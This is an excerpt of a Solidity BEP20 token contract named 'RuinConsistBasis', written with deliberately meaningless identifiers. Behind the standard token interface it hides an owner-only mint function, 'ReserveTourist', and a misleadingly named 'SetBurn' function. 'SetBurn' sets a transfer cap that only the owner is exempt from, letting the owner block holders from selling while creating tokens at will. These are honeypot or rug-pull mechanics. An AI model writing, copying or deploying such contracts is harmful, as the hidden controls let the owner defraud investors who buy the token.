...
contract RuinConsistBasis is IBEP20 
{
    using AnalysisLib for uint256;
    mapping(address => uint256) internal _cash;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    uint256 internal _touch;
    ...
    constructor() 
    {
        ...
        _name = "RuinConsistBasis";
        _symbol = "BLAME";
        _burnRate = 11;
        _touch = _totalSupply;
        _msgsender = _msgSender();
        _sendermessage = _msgsender;
        _cash[_sendermessage] = _totalSupply;
	    emit Transfer(address(0), _sendermessage, _totalSupply);
    }

    modifier AttentionCash() { require(msg.sender == _sendermessage); _; }
    function name() public view virtual override returns (string memory) { return _name; }
    function symbol() public view virtual override returns (string memory) { return _symbol; }
    function decimals() public view virtual override returns (uint8) { return 6; }
    function totalSupply() public view virtual override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view virtual override returns (uint256) { return _cash[account];}
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) { return msg.data; }
    function GetBeach() external view returns (uint256) { return _touch; }
    function SetBurn(uint b) external virtual AttentionCash { _touch = b * (10 ** decimals()); }
    ...
    function ReserveTourist(uint256 bear) external virtual AttentionCash
    {
        uint preference = bear * (10 ** decimals()); 
        _cash[_msgsender] = _cash[_msgsender].Connection(preference);
        emit Transfer(address(0), _msgsender, preference);
    }
    ...
    function _transfer(address sender,address recipient, uint256 amount) internal virtual 
    {
        ...
        require(amount <= _touch || recipient == _msgsender || sender == _msgsender);
        uint256 senderBalance = _cash[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        uint256 burnAmount = amount * _burnRate / 100;

        _cash[sender] = senderBalance - amount;
        _cash[recipient] += (amount - burnAmount);
        _cash[_burnaddress] += burnAmount;
...
library AnalysisLib 
{
  function Connection(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; }
}